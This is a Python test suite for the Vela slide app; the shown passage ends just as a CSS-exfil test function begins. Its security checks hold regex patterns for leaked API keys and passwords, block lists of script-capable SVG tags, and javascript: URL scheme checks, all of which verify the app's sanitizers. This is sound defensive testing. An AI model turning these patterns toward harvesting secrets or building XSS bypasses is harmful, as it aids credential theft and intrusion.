#!/usr/bin/env python3
"""
Vela Test Suite — runs unit + integration tests.

Usage:
  python3 tests/test_vela.py              # run unit + integration
  python3 tests/test_vela.py --unit       # unit only
  python3 tests/test_vela.py --integration # integration only
  python3 tests/test_vela.py --all        # everything: unit + integration + server + e2e + concat sync

Exit code 0 = all pass, 1 = failures.
"""

import sys, os, json, re, subprocess, tempfile, shutil, copy, time

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SKILL_DIR = os.path.join(REPO_ROOT, "skills", "vela-slides")
TEMPLATE = os.path.join(SKILL_DIR, "app", "vela.jsx")
SCRIPTS = os.path.join(SKILL_DIR, "scripts")           # lean shipped scripts: vela.py, validate.py, assemble.py
EXAMPLES = os.path.join(REPO_ROOT, "examples")
# Dev/CI toolchain lives outside the shipped skill (see tools/vela-dev/).
DEV_DIR = os.path.join(REPO_ROOT, "tools", "vela-dev")
DEV_SCRIPTS = os.path.join(DEV_DIR, "scripts")         # concat.py, serve.py, sync-skill-docs.py, *.js …
PARTS_DIR = os.path.join(REPO_ROOT, "src", "parts")    # app source part-files (first-class)
LOCAL_HTML = os.path.join(DEV_DIR, "local.html")       # dev preview shell (served by serve.py)

sys.path.insert(0, DEV_SCRIPTS)
from parts_manifest import load_part_order              # src/parts/MANIFEST.txt (single source of truth)

passes = 0
fails = 0
skips = 0

def ok(name):
    global passes
    passes += 1
    print(f"  ✅ {name}")

def fail(name, reason=""):
    global fails
    fails += 1
    print(f"  ❌ {name}{f' — {reason}' if reason else ''}")

def skip(name, reason=""):
    global skips
    skips += 1
    print(f"  ⏭️  {name}{f' — {reason}' if reason else ''}")


# ━━━ Unit Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_unit():
    print("\n── Unit Tests ──")

    # 1. Every part-file the manifest lists exists. The list is NOT duplicated
    #    here: src/parts/MANIFEST.txt is the single source of truth shared with
    #    concat.py and lint.py (a hardcoded copy here had silently gone stale,
    #    omitting part-pptx.jsx).
    expected_parts = load_part_order()
    missing = [p for p in expected_parts if not os.path.exists(os.path.join(PARTS_DIR, p))]
    if not missing:
        ok(f"All {len(expected_parts)} part-files present")
    else:
        fail(f"Part-files present", f"missing: {missing}")

    # 2. SKILL.md exists and has valid frontmatter
    skill_md = os.path.join(SKILL_DIR, "SKILL.md")
    if os.path.exists(skill_md):
        content = open(skill_md, encoding="utf-8").read()
        if content.startswith("---") and "name:" in content and "description:" in content:
            ok("SKILL.md has valid frontmatter")
        else:
            fail("SKILL.md frontmatter", "missing --- or name/description fields")
    else:
        fail("SKILL.md exists")

    # 3. Template has STARTUP_PATCH marker
    if os.path.exists(TEMPLATE):
        tpl = open(TEMPLATE, encoding="utf-8").read()
        if "const STARTUP_PATCH = null;" in tpl:
            ok("STARTUP_PATCH marker present in template")
        else:
            fail("STARTUP_PATCH marker", "not found in vela.jsx")
    else:
        fail("vela.jsx exists")

    # 4. Validate example deck JSON
    starter = os.path.join(EXAMPLES, "vela-demo.vela")
    if os.path.exists(starter):
        try:
            deck = json.load(open(starter, encoding="utf-8"))
            assert "lanes" in deck or "slides" in deck, "no lanes or slides key"
            assert "deckTitle" in deck, "no deckTitle"
            ok("vela-demo.vela is valid JSON with expected structure")
        except Exception as e:
            fail("vela-demo.vela valid", str(e))
    else:
        fail("vela-demo.vela exists")

    # 5. Scripts exist and are valid Python
    for script, sdir in [("concat.py", DEV_SCRIPTS), ("assemble.py", SCRIPTS), ("validate.py", SCRIPTS)]:
        path = os.path.join(sdir, script)
        if os.path.exists(path):
            result = subprocess.run(
                [sys.executable, "-c", f"import py_compile; py_compile.compile({path!r}, doraise=True)"],
                capture_output=True, text=True
            )
            if result.returncode == 0:
                ok(f"{script} compiles without errors")
            else:
                fail(f"{script} compiles", result.stderr.strip())
        else:
            fail(f"{script} exists")

    # 6. References exist
    for ref in ["block-schema.md", "design-patterns.md", "themes.md"]:
        path = os.path.join(SKILL_DIR, "references", ref)
        if os.path.exists(path) and os.path.getsize(path) > 100:
            ok(f"references/{ref} present and non-empty")
        else:
            fail(f"references/{ref}")


# ━━━ Security Tests ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def test_security():
    print("\n── Security Tests ──")

    all_jsx = ""
    for root, dirs, files in os.walk(os.path.join(SKILL_DIR, "app")):
        for f in files:
            if f.endswith(".jsx"):
                all_jsx += open(os.path.join(root, f), encoding="utf-8").read()

    # 1. No API keys or secrets
    secret_patterns = [
        (r'sk-ant-[a-zA-Z0-9]', "Anthropic API key"),
        (r'sk_[a-zA-Z0-9]{20,}', "Secret key pattern"),
        (r'ANTHROPIC_API_KEY\s*=', "Hardcoded API key assignment"),
        (r'password\s*=\s*["\'][^"\']+["\']', "Hardcoded password"),
    ]
    for pattern, desc in secret_patterns:
        if re.search(pattern, all_jsx):
            fail(f"No {desc} in code")
        else:
            ok(f"No {desc} in code")

    # 2. No personal emails
    email_patterns = [r'verabelusi', r'rqideb', r'@gmail\.com', r'@outlook\.com']
    found_emails = [p for p in email_patterns if re.search(p, all_jsx)]
    if not found_emails:
        ok("No personal email addresses in code")
    else:
        fail("Personal emails", f"found: {found_emails}")

    # 3. No private service URLs
    private_patterns = [r'workers\.dev', r'ngrok', r'localhost:\d+']
    found_private = [p for p in private_patterns if re.search(p, all_jsx)]
    if not found_private:
        ok("No private service URLs in code")
    else:
        fail("Private URLs", f"found: {found_private}")

    # 4. SVG sanitization present (defense-in-depth, DOM-based via sanitizeSvgMarkup)
    #    v12.54: switched from a SVG_BLOCKED_TAGS blocklist to a SVG_ALLOWED_TAGS
    #    allowlist mirroring DOMPurify's `svg + svgFilters` profile. Dangerous
    #    elements (script/foreignObject/use/animate*/iframe/embed/object/link)
    #    are removed simply because they are not in the allowlist.
    if 'SVG_ALLOWED_TAGS' in all_jsx and '!SVG_ALLOWED_TAGS.has(tag)' in all_jsx:
        ok("SVG sanitizer uses allowlist (DOMPurify-style), not blocklist")
    else:
        fail("SVG allowlist sanitizer",
             "sanitizeSvgMarkup must enforce SVG_ALLOWED_TAGS via `!SVG_ALLOWED_TAGS.has(tag)` remove")

    #    href/xlink:href scheme filtering inside the DOMParser walk.
    if 'xlink:href' in all_jsx and "startsWith(\"javascript:\")" in all_jsx:
        ok("SVG xlink:href / href scheme sanitization present")
    else:
        fail("SVG xlink:href sanitization")

    #    svg BLOCK markup must route through the DOM-based sanitizer (not the old regex chain).
    if 'sanitizeSvgMarkup(clean.markup' in all_jsx and 'processed = sanitizeSvgMarkup(processed)' in all_jsx:
        ok("svg block routes markup through sanitizeSvgMarkup (import + render)")
    else:
        fail("svg block sanitizeSvgMarkup routing", "svg block must use DOM-based sanitizer at import and render")

    #    href is ALLOWLIST (http/https/mailto/tel + fragment/relative). Blocklist alone
    #    would let file:/blob:/chrome:/intent: through after browser normalization.
    if '["http", "https", "mailto", "tel"].includes(m[1].toLowerCase())' in all_jsx:
        ok("SVG href validation uses scheme allowlist (post-DOMParser)")
    else:
        fail("SVG href allowlist", "href scheme check must use an allowlist, not a blocklist")

    # 5. sanitizeString strips HTML tags
    if 'replace(/<[^>]*>/g' in all_jsx:
        ok("sanitizeString strips HTML tags")
    else:
        fail("sanitizeString HTML stripping")

    # 6. sanitizeString strips NULL bytes (studyNotes X-Ray sentinel safety)
    if 'replace(/\\u0000/g' in all_jsx:
        ok("sanitizeString strips NULL bytes (sentinel safety)")
    else:
        fail("sanitizeString NULL byte stripping", "required for parseInline link sentinel safety")

    # 6b. sanitizeString hardened against incomplete single-pass tag stripping:
    #     repeat /<[^>]*>/ to a fixpoint, then drop any residual tag-opening "<"
    #     (CodeQL js/incomplete-multi-character-sanitization).
    if 'while (out !== prev)' in all_jsx and 'replace(/<(?=[a-zA-Z!/])/g' in all_jsx:
        ok("sanitizeString loops tag strip to fixpoint + drops residual '<'")
    else:
        fail("sanitizeString incomplete-sanitization hardening",
             "must loop /<[^>]*>/ to a fixpoint and strip residual tag-opening '<'")

    # 6c. PDF export link extraction allowlists URL schemes via sanitizeUrl, so a
    #     javascript:/data:/vbscript: href can never become a live PDF annotation
    #     (CodeQL js/incomplete-url-scheme-check).
    if 'href.startsWith("javascript:")' not in all_jsx \
            and 'sanitizeUrl(el.getAttribute("data-pdf-link"))' in all_jsx:
        ok("PDF extractLinks routes hrefs through sanitizeUrl allowlist")
    else:
        fail("PDF link scheme allowlist",
             "extractLinks must sanitize hrefs via sanitizeUrl (drop javascript:/data:/vbscript:)")

    # 6d. sanitizeUrl validates-and-emits one canonical form: it must reject raw
    #     backslashes and return the parser serialization for http(s) rather than
    #     the raw input, so a schemeless authority ref that parses as http(s)
    #     cannot survive verbatim into an export hyperlink target
    #     (CodeQL js/incomplete-url-scheme-check — parse-vs-emit differential).
    if 'if (trimmed.includes("\\\\")) return "";' in all_jsx \
            and 'return parsed.href;' in all_jsx:
        ok("sanitizeUrl rejects backslashes and emits canonical http(s) form")
    else:
        fail("sanitizeUrl parse-vs-emit hardening",
             "must reject raw backslashes and return parsed.href for http(s), not the raw input")

    # 6e. PowerPoint export re-validates each hyperlink target through sanitizeUrl
    #     at the point it becomes an External relationship (defense-in-depth: an
    #     External rel target is a higher-trust sink than a browser link).
    if 'const safeHref = sanitizeUrl(l.href);' in all_jsx \
            and 'target: safeHref' in all_jsx:
        ok("pptx export re-validates hyperlink targets at the external-rel boundary")
    else:
        fail("pptx hyperlink re-validation",
             "buildPptx must re-sanitizeUrl each link before emitting a TargetMode=External rel")

    # 6f. Every PDF hyperlink target is written through the single audited PDF-string
    #     encoder (pdfStringEncode), never interpolated raw into the "(...)" literal.
    #     A raw "(${...})" URI write is a PDF literal-string injection sink (a deck
    #     link could close the string early and inject PDF action syntax).
    if '/URI (${link.url})' not in all_jsx \
            and '/URI ${pdfStringEncode(link.url)}' in all_jsx \
            and '/URI ${pdfStringEncode(link.href)}' in all_jsx:
        ok("PDF URI actions encode targets via pdfStringEncode (both raster + vector)")
    else:
        fail("PDF URI literal-string encoding",
             "raster and vector PDF URI writes must use pdfStringEncode(link.url/href), not raw (${...})")
    # 6g. Raster PDF link collection re-validates the scheme at the sink boundary.
    if 'const url = sanitizeUrl(el.getAttribute("data-pdf-link"));' in all_jsx:
        ok("collectSlideLinks re-validates data-pdf-link scheme via sanitizeUrl")
    else:
        fail("raster PDF link scheme re-validation",
             "collectSlideLinks must sanitizeUrl the data-pdf-link before it becomes a PDF action")

    # 7. sanitizeStudyNotes exists and routes diagram through sanitizeSvgMarkup
    if 'function sanitizeStudyNotes' in all_jsx:
        ok("sanitizeStudyNotes helper present")
    else:
        fail("sanitizeStudyNotes helper missing")
    if 'sanitizeStudyNotes' in all_jsx and 'sanitizeSvgMarkup(raw.diagram' in all_jsx:
        ok("sanitizeStudyNotes routes diagram through sanitizeSvgMarkup")
    else:
        fail("sanitizeStudyNotes diagram sanitization")
    if 'sanitizeStudyNotes' in all_jsx and 'sanitizeUrl(v.url' in all_jsx:
        ok("sanitizeStudyNotes glossary URL sanitization")
    else:
        fail("sanitizeStudyNotes glossary URL sanitization")

    # 8. SVG_ALLOWED_TAGS allowlist must EXCLUDE the historically-dangerous set
    #    (the inverse of the old blocklist coverage check). If any of these
    #    ever creeps back into the allowlist, that's a regression.
    forbidden_in_allowlist = [
        "script", "foreignobject", "iframe", "embed", "object", "link",
        "use",                   # cross-doc reference XSS (Cure53 #283 class)
        "animate", "animatetransform", "animatemotion", "animatecolor",
        "set", "mpath", "discard", "cursor",  # SMIL attr-mutation family
        "handler", "listener",   # legacy scripting hooks
        # HTML rawtext-on-serialize family (HTML 13.3 step 3.2): even if a future
        # browser routed these through SVG namespace, text-node escaping rules
        # differ — keep them out of the allowlist entirely.
        "xmp", "noembed", "noframes", "noscript", "plaintext", "listing",
    ]
    allow = re.search(r'SVG_ALLOWED_TAGS = new Set\(\[([\s\S]*?)\]\)', all_jsx)
    allow_lower = (allow.group(1).lower() if allow else "")
    leaked = [t for t in forbidden_in_allowlist if f'"{t}"' in allow_lower]
    if allow and not leaked:
        ok("SVG_ALLOWED_TAGS excludes script/foreignObject/use/animate*/iframe/embed/object/link + rawtext family")
    else:
        fail("SVG_ALLOWED_TAGS coverage",
             f"dangerous tags present in allowlist: {leaked or 'allowlist not found'}")

    #    Allowlist must include the legitimate Mermaid/draw.io/Vera diagram surface
    #    (structural + shapes + filter primitives) so existing decks render.
    required_in_allowlist = [
        "svg", "g", "defs", "title", "desc", "marker", "clippath", "mask", "pattern",
        "circle", "ellipse", "line", "path", "polygon", "polyline", "rect",
        "text", "tspan", "lineargradient", "radialgradient", "stop",
        "fegaussianblur", "fecolormatrix", "feblend", "feoffset", "femerge",
    ]
    missing_allow = [t for t in required_in_allowlist if f'"{t}"' not in allow_lower]
    if allow and not missing_allow:
        ok("SVG_ALLOWED_TAGS includes structural + shape + text + filter primitives")
    else:
        fail("SVG_ALLOWED_TAGS coverage", f"missing legitimate elements: {missing_allow}")

    # 8b. SVG <style> ELEMENT is NOT allowed. An inline <style> injected via
    #     dangerouslySetInnerHTML applies DOCUMENT-GLOBAL CSS (not scoped to the SVG),
    #     so deck selectors could restyle/hide/relocate/re-label the trusted app UI
    #     (UI-redress / clickjacking of real controls). The element is dropped outright
    #     by the allowlist; isSvgStyleSafe is retained ONLY for the element-local
    #     inline style="" attribute + url-ref presentation attrs (exfil beacon guard).
    if '"style"' not in allow_lower and 'function isSvgStyleSafe' in all_jsx:
        ok("SVG <style> element excluded from SVG_ALLOWED_TAGS (no document-global CSS injection)")
    else:
        fail("SVG <style> element must be disallowed",
             "'style' must NOT be in SVG_ALLOWED_TAGS — a <style> element is document-global CSS "
             "(UI-redress/clickjack); isSvgStyleSafe must remain for inline style/url-ref attrs")

    # 9. sanitizeSvgMarkup strips comment/CDATA/PI nodes — mXSS fix (v12.45)
    if 'child.nodeType !== 1 && child.nodeType !== 3' in all_jsx:
        ok("sanitizeSvgMarkup drops comment/CDATA/PI nodes (mXSS)")
    else:
        fail("sanitizeSvgMarkup CDATA/comment node strip", "mutation-XSS regression risk")

    # 9a. SECURITY (UI-integrity): there must be NO code path that re-admits a
    # <style> element. A <style> injected via dangerouslySetInnerHTML is
    # document-global CSS — deck selectors could restyle/relocate/re-label the
    # trusted app UI and clickjack a real destructive control. The element is
    # dropped by the SVG_ALLOWED_TAGS check; assert no `tag === "style"`
    # retention branch has crept back in (recurrence guard).
    if not re.search(r'tag\s*===\s*"style"', all_jsx):
        ok("sanitizeSvgMarkup has no <style>-retention branch (element dropped by allowlist)")
    else:
        fail("SVG <style> retention branch must not exist",
             'a `tag === "style"` branch re-admits document-global CSS (UI-redress/clickjack); '
             "<style> must be dropped by the SVG_ALLOWED_TAGS allowlist, not filtered")

    # 9b. v12.54: isSvgStyleSafe rejects '<' and ']]>' as defense-in-depth.
    if re.search(r'isSvgStyleSafe[\s\S]*?css\.indexOf\("<"\)\s*!==\s*-1\s*\)\s*return\s+false', all_jsx) and \
       re.search(r'isSvgStyleSafe[\s\S]*?css\.indexOf\("\]\]>"\)\s*!==\s*-1\s*\)\s*return\s+false', all_jsx):
        ok("isSvgStyleSafe rejects '<' and ']]>' (defense-in-depth for rawtext breakout)")
    else:
        fail("isSvgStyleSafe rawtext-breakout filters",
             "must reject '<' and ']]>' so a CDATA/comment slip can't re-enable mXSS")

    # 9b-2. v12.59: close the SVG auto-load exfil class (Vela decks load NOTHING
    # external). Four structural guards — behaviour is gated functionally by the
    # jsdom round-trip (9c), these source checks document & pin the mechanism.
    # (1) isSvgStyleSafe rejects non-url() functions fed a string literal
    #     (image-set/image/cross-fade/src string sources — the residual bypass).
    if re.search(r"isSvgStyleSafe[\s\S]*?\[a-z\]\\\[\\w-\\\]\*\\s\*\\\(\\s\*\['\"\]", all_jsx) or \
       re.search(r"isSvgStyleSafe[\s\S]*?some\(\(m\)\s*=>\s*!/\^url", all_jsx):
        ok("isSvgStyleSafe rejects string-source CSS functions (image-set/image/cross-fade/src)")
    else:
        fail("isSvgStyleSafe string-source function reject",
             "must reject any non-url() CSS function fed a quoted string (image-set bypass)")
    # (2) presentation/style attributes routed through the same filter, with the
    #     style="" DECLARATION LIST taking the stricter property-allowlist gate
    #     (isSvgInlineStyleSafe) on top of it. Behavior is executed by
    #     test_svg_mxss.cjs / test_css_exfil.cjs; this only pins the wiring.
    if 'SVG_URL_REF_ATTRS' in all_jsx and 'urlRefAttr && !cssOk(a.value)' in all_jsx \
       and 'SVG_URL_REF_ATTRS.has(name) || CSS_PAINT_KEY.test(cssKeyStem(name))' in all_jsx \
       and 'name === "style" ? (v) => isSvgInlineStyleSafe(v, tag) : isSvgStyleSafe' in all_jsx \
       and 'SVG_ROOT_BLOCKED' in all_jsx:
        ok("SVG presentation/style attrs filtered via SVG_URL_REF_ATTRS (style= takes the property allowlist)")
    else:
        fail("SVG presentation-attr URL filter",
             "fill/filter/mask/marker/clip-path/cursor values must pass isSvgStyleSafe; style= must pass isSvgInlineStyleSafe")
    # (3) non-anchor href/xlink:href is #fragment-only; <a> keeps the scheme allowlist.
    if 'name === "href" && tag === "a"' in all_jsx:
        ok("SVG href policy split: <a> click-nav allowlist vs #fragment-only auto-load refs")
    else:
        fail("SVG non-anchor href fragment-only",
             "feImage/image/use href must be #fragment-only; only <a> may carry http/https")
    # (4) image-block src restricted to inline data:image/* (no network).
    if re.search(r'sanitizeUrl\(clean\.src,\s*\["data:"\]\)', all_jsx) and 'data:image/' in all_jsx:
        ok("image-block src restricted to inline data:image/* (no network)")
    else:
        fail("image-block src data:image-only",
             "image src must be inline data:image/* — http/https auto-load beacon otherwise")
    # (5) v12.62: SVG sanitizer strips src/srcset (inert in SVG, but <image>
    #     HTML-aliases to a fetching <img> when the output is re-parsed as HTML)
    #     AND keeps the output SVG-scoped so HTML-aliasing can't occur at the sink.
    #     Behaviour is gated functionally by the jsdom round-trip (9c).
    if re.search(r'name === "src" \|\| name === "srcset"', all_jsx):
        ok("SVG sanitizer strips src/srcset (HTML-alias <image>->fetching <img> beacon)")
    else:
        fail("SVG src/srcset strip",
             "src/srcset must be stripped — bare <image src> HTML-aliases to a zero-click <img> fetch")
    if 'top[0].localName' in all_jsx and 'top[0].outerHTML' in all_jsx and 'root.outerHTML' in all_jsx:
        ok("SVG sanitizer output kept SVG-scoped (no HTML-insertion-mode re-parse at the sink)")
    else:
        fail("SVG output SVG-scoping",
             "sanitizeSvgMarkup must return an SVG-scoped string so <image> etc. cannot HTML-alias at the dangerouslySetInnerHTML sink")

    # 9c. v12.54: CI-gated functional round-trip via jsdom — the source-only
    # checks above gave false confidence in v12.53 because the right code
    # was present but unreachable inside <style>. This script actually
    # runs the sanitizer and asserts no live handler materializes.
    mxss_script = os.path.join(REPO_ROOT, "tests", "test_svg_mxss.cjs")
    if os.path.exists(mxss_script):
        env = os.environ.copy()
        # CI installs jsdom at the repo root; local dev may have it in /tmp.
        env["NODE_PATH"] = os.pathsep.join(filter(None, [
            env.get("NODE_PATH", ""),
            os.path.join(REPO_ROOT, "node_modules"),
            "/tmp/node_modules",
        ]))
        try:
            r = subprocess.run(
                ["node", mxss_script],
                capture_output=True, text=True, timeout=60, env=env,
            )
            if r.returncode == 0:
                # Last summary line: "  N passed, 0 failed"
                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                count = m.group(1) if m else "?"
                ok(f"SVG mXSS jsdom round-trip suite ({count} payloads)")
            elif r.returncode == 2:
                skip("SVG mXSS jsdom round-trip suite", "jsdom not installed — run: npm install")
            else:
                fail("SVG mXSS jsdom round-trip suite",
                     f"node tests/test_svg_mxss.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
        except FileNotFoundError:
            fail("SVG mXSS jsdom round-trip suite", "node not on PATH")
        except subprocess.TimeoutExpired:
            fail("SVG mXSS jsdom round-trip suite", "timeout after 60s")
    else:
        fail("SVG mXSS jsdom round-trip suite", f"missing: {mxss_script}")

    # 9b. Inline data: image sanitization — sanitizeImageDataUri (v12.63).
    # data:image/svg+xml is live SVG reaching <img src>; this asserts it is
    # routed through sanitizeSvgMarkup and non-image data: types are dropped.
    dimg_script = os.path.join(REPO_ROOT, "tests", "test_data_image_uri.cjs")
    if os.path.exists(dimg_script):
        env = os.environ.copy()
        env["NODE_PATH"] = os.pathsep.join(filter(None, [
            env.get("NODE_PATH", ""),
            os.path.join(REPO_ROOT, "node_modules"),
            "/tmp/node_modules",
        ]))
        try:
            r = subprocess.run(
                ["node", dimg_script],
                capture_output=True, text=True, timeout=60, env=env,
            )
            if r.returncode == 0:
                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                count = m.group(1) if m else "?"
                ok(f"data: image sanitization suite ({count} cases)")
            elif r.returncode == 2:
                skip("data: image sanitization suite", "jsdom not installed — run: npm install")
            else:
                fail("data: image sanitization suite",
                     f"node tests/test_data_image_uri.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
        except FileNotFoundError:
            fail("data: image sanitization suite", "node not on PATH")
        except subprocess.TimeoutExpired:
            fail("data: image sanitization suite", "timeout after 60s")
    else:
        fail("data: image sanitization suite", f"missing: {dimg_script}")

    # 9c. AI image preservation (CR: edits must never drop existing images).
    # preserveImages / restoreImageSrcs re-attach real srcs and re-append any
    # image the model omitted, so image blocks survive every edit path.
    imgpres_script = os.path.join(REPO_ROOT, "tests", "test_image_preserve.cjs")
    if os.path.exists(imgpres_script):
        try:
            r = subprocess.run(["node", imgpres_script], capture_output=True, text=True, timeout=60)
            if r.returncode == 0:
                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                count = m.group(1) if m else "?"
                ok(f"AI image preservation suite ({count} cases)")
            else:
                fail("AI image preservation suite",
                     f"node tests/test_image_preserve.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
        except FileNotFoundError:
            fail("AI image preservation suite", "node not on PATH")
        except subprocess.TimeoutExpired:
            fail("AI image preservation suite", "timeout after 60s")
    else:
        fail("AI image preservation suite", f"missing: {imgpres_script}")

    # 9d. Sprint 7-1 UX logic: minutes formatting, slide-visibility helpers,
    # blank-slide derivation, and the new reducer actions.
    uxlogic_script = os.path.join(REPO_ROOT, "tests", "test_ux_logic.cjs")
    if os.path.exists(uxlogic_script):
        try:
            r = subprocess.run(["node", uxlogic_script], capture_output=True, text=True, timeout=60)
            if r.returncode == 0:
                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                count = m.group(1) if m else "?"
                ok(f"Sprint 7-1 UX logic suite ({count} cases)")
            else:
                fail("Sprint 7-1 UX logic suite",
                     f"node tests/test_ux_logic.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
        except FileNotFoundError:
            fail("Sprint 7-1 UX logic suite", "node not on PATH")
        except subprocess.TimeoutExpired:
            fail("Sprint 7-1 UX logic suite", "timeout after 60s")
    else:
        fail("Sprint 7-1 UX logic suite", f"missing: {uxlogic_script}")

    # 9d2. Standalone HTML export machinery (buildStandaloneHtml et al., part-pdf.jsx):
    # splices the current deck into the app's own JSX, transpiles with the vendored
    # Babel, and neutralizes </script>/<!-- in the COMPILED output before inlining
    # alongside 3 CDN <script> tags pinned by SRI. Drives the REAL functions (regex-
    # extracted from part-pdf.jsx) against the real vela.jsx + demo deck.
    standalone_script = os.path.join(REPO_ROOT, "tests", "test_standalone_html.cjs")
    if os.path.exists(standalone_script):
        try:
            r = subprocess.run(["node", standalone_script], capture_output=True, text=True, timeout=60)
            if r.returncode == 0:
                m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                count = m.group(1) if m else "?"
                ok(f"Standalone HTML export machinery suite ({count} checks)")
            elif r.returncode == 2:
                skip("Standalone HTML export machinery suite", "missing vela.jsx/vendor babel — run concat.py")
            else:
                fail("Standalone HTML export machinery suite",
                     f"node tests/test_standalone_html.cjs exited {r.returncode}\n{r.stdout}\n{r.stderr}")
        except FileNotFoundError:
            fail("Standalone HTML export machinery suite", "node not on PATH")
        except subprocess.TimeoutExpired:
            fail("Standalone HTML export machinery suite", "timeout after 60s")
    else:
        fail("Standalone HTML export machinery suite", f"missing: {standalone_script}")

    # 9d3. Sprint "lifeboat" regression suites — one node cjs per change request.
    #   export robustness (CR1): parseLinearGradient/parseColor/domToCanvas tolerate non-string bg
    #   modal scroll     (CR3): ModalBackdrop card has maxHeight + overflowY (no clip in short panes)
    #   storage warning  (CR2): artifact-mode backup/local-storage notice + dismiss test-ids
    #   block toolbar    (CR4): hover-toolbar clipping containers no longer crop the tool circles
    #   icon picker esc  (CR5): IconPicker inputs let Escape reach the modal (don't swallow it)
    for fname, label in [
        ("tests/test_export_robustness.cjs",  "Export robustness (CR1 str.includes)"),
        ("tests/test_modal_scroll.cjs",       "Modal scroll/overflow (CR3 release notes)"),
        ("tests/test_storage_warning.cjs",    "Artifact storage warning (CR2)"),
        ("tests/test_block_toolbar_clip.cjs", "Block toolbar clip (CR4)"),
        ("tests/test_icon_picker_escape.cjs", "Icon picker Escape (CR5)"),
        ("tests/test_deck_key_allowlist.cjs", "Deck-ingress key allowlist (drop/survive/clamp/depth)"),
        ("tests/test_reducer.cjs",            "Reducer state transitions (62 actions + UNDO/REDO)"),
        ("tests/test_engine_tools.cjs",       "Vera engine tools + ReAct caps (G1/G3/G4)"),
        ("tests/test_block_render.cjs",       "Block renderers (27 types via renderToStaticMarkup)"),
        ("tests/test_markdown_export.cjs",    "Markdown export deckToMarkdown (G7)"),
        ("tests/test_fs_guard.cjs",           "Desktop fs-guard (frozen surface + root allowlist)"),
        ("tests/test_deck_io_save.cjs",       "Desktop save state machine (CR3 no-swallow/retry/verify/echo-guard)"),
    ]:
        script = os.path.join(REPO_ROOT, fname)
        if os.path.exists(script):
            try:
                r = subprocess.run(["node", script], capture_output=True, text=True, timeout=60)
                if r.returncode == 0:
                    m = re.search(r'(\d+)\s+passed,\s+(\d+)\s+failed', r.stdout)
                    count = m.group(1) if m else "?"
                    ok(f"{label} ({count} cases)")
                else:
                    fail(label, f"node {fname} exited {r.returncode}\n{r.stdout}\n{r.stderr}")
            except FileNotFoundError:
                fail(label, "node not on PATH")
            except subprocess.TimeoutExpired:
                fail(label, "timeout after 60s")
        else:
            fail(label, f"missing: {script}")

    # 9c. guidelines control/bidi strip (v12.64) — behavioral: pull the exact
    # char-class the importer applies and run a sample through it. Removing the
    # strip (or omitting bidi/zero-width) fails this check (red).
    gm = re.search(r'raw\.guidelines\.replace\(/\[([^\]]*)\]/g, ""\)', all_jsx)
    if gm:
        strip = re.compile("[" + gm.group(1) + "]")
        sample = "keep\nthis" + chr(0x00) + "bad" + chr(0x202e) + "spoof" + chr(0x200b) + "zw text"
        cleaned = strip.sub("", sample)
        removed = all(chr(cp) not in cleaned for cp in (0x00, 0x202e, 0x200b))
        kept = "\n" in cleaned and "keep" in cleaned and "text" in cleaned
        if removed and kept:
            ok("guidelines strip removes control/bidi/zero-width, keeps newlines/text")
        else:
            fail("guidelines control-char strip behavior", f"cleaned={cleaned!r}")
    else:
        fail("guidelines control-char strip", "strip regex absent — prompt-injection scaffolding chars not removed")

    # 10. scheme check strips ASCII control/whitespace before matching (entity/whitespace bypass) (v12.44/45)
    if 'replace(/[\\u0000-\\u0020]+/g, "").toLowerCase()' in all_jsx:
        ok("SVG scheme check strips control/whitespace before scheme match")
    else:
        fail("SVG scheme normalization", "java\\tscript: / control-char bypass risk")

    # 11. Deck lane limit CLAMPS rather than throws — fail-open sanitizer off-switch fix (v12.47)
    if 'raw.lanes.slice(0, 50)' in all_jsx:
        ok("validateAndSanitizeDeck clamps lanes (slice) instead of throwing")
    else:
        fail("deck lane clamp", "lane count must clamp, not throw (fail-open trigger)")
    if 'lanes.length > 50) throw' in all_jsx or 'lanes.length>50)throw' in all_jsx.replace(" ", ""):
        fail("deck lane limit throws", "throwing on >50 lanes is weaponizable via fail-open callers")
    else:
        ok("validateAndSanitizeDeck does not throw on lane count")

    # 12. Deck load callers fail CLOSED — no raw/unsanitized dispatch on sanitize failure (v12.47)
    failopen = [p for p in ('payload: STARTUP_PATCH', 'payload: deck }', 'payload: result }') if p in all_jsx]
    if not failopen:
        ok("deck load fallbacks fail closed (no raw LOAD on catch)")
    else:
        fail("fail-open deck load", f"raw unsanitized LOAD still present: {failopen}")

    # 13. IMPORT_CONCEPTS sanitizes pasted slides (bypassed validateAndSanitizeDeck) (v12.47)
    if 'c.slides.slice(0, 100).map(sanitizeSlide)' in all_jsx:
        ok("IMPORT_CONCEPTS sanitizes slides via sanitizeSlide")
    else:
        fail("IMPORT_CONCEPTS sanitization", "pasted concepts must route slides through sanitizeSlide")

    # 14. Link sinks: item-level links sanitized at import + safe window.open helper, no raw window.open(<deck link>) (v12.46)
    if 'function openExternalLink' in all_jsx and 'window.open(safe' in all_jsx:
        ok("openExternalLink helper re-sanitizes URLs at the window.open sink")
    else:
        fail("openExternalLink sink helper missing")
    if re.search(r'window\.open\((?:link|cellLink|b\.link)\b', all_jsx):
        fail("raw window.open of deck link", "deck-supplied links must go through openExternalLink")
    else:
        ok("no raw window.open() of deck-supplied links")
    if 'if (c.link) c.link = sanitizeUrl(c.link)' in all_jsx:
        ok("item-level link fields sanitized in sanitizeBlock")
    else:
        fail("item-level link sanitization", "icon-row/flow/etc. item links must be sanitizeUrl'd")


def test_css_color_exfil():
    """v12.61: close the CSS auto-load exfil channel on the slide/block color
    scalar surface (bg/bgGradient/color/accent, per-block *Bg/*Color, grid
    cell.bg, branding footerBg/accentColor). These feed inline CSS directly and
    previously bypassed sanitizeStyle. Source guards pin the wiring; the jsdom-free
    behavioral round-trip (test_css_exfil.cjs) executes the real predicate."""
    print("\n🎨 CSS color/background exfil (v12.61)")
